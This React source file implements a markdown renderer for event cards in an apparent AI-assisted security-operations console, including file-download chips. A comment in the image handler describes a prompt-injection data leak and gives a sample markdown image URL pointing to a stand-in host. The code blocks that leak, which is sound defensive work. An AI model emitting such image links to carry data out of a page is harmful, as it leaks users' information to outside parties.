// Compact markdown renderer for long text (研判结论 / 处置建议 / 详情)
// inside event cards. GFM enabled; styled with semantic tokens so it
// follows the theme. Distinct from FloatingAi's chat renderer, which carries
// its own chat-bubble-tuned component map.

import ReactMarkdown from "react-markdown"
import remarkGfm from "remark-gfm"
import { Download } from "lucide-react"

// Download links minted by soc-ai's file_share tool (/api/v1/files/d/<token>,
// relative in chat, absolute in IM). Rendered as a file chip that downloads in
// place — the response is Content-Disposition: attachment, so no new tab.
const FILE_LINK = /\/api\/v1\/files\/d\/socf_[0-9a-f]{48}$/

function FileLink({ href, children }) {
  return (
    <a
      href={href}
      download
      className="my-0.5 inline-flex max-w-full items-center gap-1.5 rounded-md border bg-muted/50 px-2 py-1 align-middle text-foreground no-underline transition-colors hover:bg-muted"
    >
      <Download className="size-3.5 shrink-0 text-primary" />
      <span className="truncate">{children}</span>
    </a>
  )
}

function isLocalImage(src) {
  if (typeof src !== "string" || !src) return false
  if (src.startsWith("data:image/") || src.startsWith("blob:")) return true
  // Root-relative only; "//host/x" is protocol-relative, i.e. another origin.
  return src.startsWith("/") && !src.startsWith("//")
}

export function MarkdownText({ children }) {
  return (
    <ReactMarkdown
      // singleTilde off: AI prose writes ranges as 14:49~14:53 / 44000~44004,
      // which GFM would otherwise render as strikethrough.
      remarkPlugins={[[remarkGfm, { singleTilde: false }]]}
      components={{
        p: ({ children }) => (
          <p className="my-1 leading-relaxed first:mt-0 last:mb-0">
            {children}
          </p>
        ),
        // Assistant output is untrusted (it summarizes logs, tickets, web
        // pages), and a browser fetches an <img> on sight: `![](http://x/?q=…)`
        // would carry whatever the model was tricked into putting in the URL
        // off the page. Only same-origin and inline images render; anything
        // else becomes a plain link the operator has to click.
        img: ({ src, alt }) =>
          isLocalImage(src) ? (
            <img src={src} alt={alt || ""} className="my-1 max-w-full rounded" />
          ) : (
            <a
              href={src}
              target="_blank"
              rel="noreferrer"
              className="text-primary underline underline-offset-2"
            >
              {alt || "外部图片"}（外链，未加载）
            </a>
          ),
        a: ({ children, href }) =>
          href && FILE_LINK.test(href) ? (
            <FileLink href={href}>{children}</FileLink>
          ) : (
            <a
              href={href}
              target="_blank"
              rel="noreferrer"
              className="text-primary underline underline-offset-2"
            >
              {children}
            </a>
          ),
        code: ({ inline, children, ...rest }) =>
          inline ? (
            <code
              className="rounded bg-muted px-1 py-0.5 font-mono text-[0.9em]"
              {...rest}
            >
              {children}
            </code>
          ) : (
            <code className="font-mono" {...rest}>
              {children}
            </code>
          ),
        pre: ({ children }) => (
          <pre className="my-1 overflow-x-auto rounded-md bg-muted p-2 font-mono">
            {children}
          </pre>
        ),
        ul: ({ children }) => (
          <ul className="my-1 ml-4 list-disc [&>li]:mt-0.5">{children}</ul>
        ),
        ol: ({ children }) => (
          <ol className="my-1 ml-4 list-decimal [&>li]:mt-0.5">{children}</ol>
        ),
        h1: ({ children }) => (
          <h1 className="mt-2 mb-1 text-sm font-semibold first:mt-0">
            {children}
          </h1>
        ),
        h2: ({ children }) => (
          <h2 className="mt-2 mb-1 text-sm font-semibold first:mt-0">
            {children}
          </h2>
        ),
        h3: ({ children }) => (
          <h3 className="mt-1.5 mb-0.5 font-semibold first:mt-0">{children}</h3>
        ),
        blockquote: ({ children }) => (
          <blockquote className="my-1 border-l-2 pl-2 text-muted-foreground">
            {children}
          </blockquote>
        ),
        table: ({ children }) => (
          <div className="my-1 overflow-x-auto">
            <table className="w-full">{children}</table>
          </div>
        ),
        th: ({ children }) => (
          <th className="border-b px-2 py-1 text-left font-medium">
            {children}
          </th>
        ),
        td: ({ children }) => (
          <td className="border-b border-border/50 px-2 py-1 align-top">
            {children}
          </td>
        ),
        hr: () => <hr className="my-2 border-border" />,
      }}
    >
      {children}
    </ReactMarkdown>
  )
}

export default MarkdownText
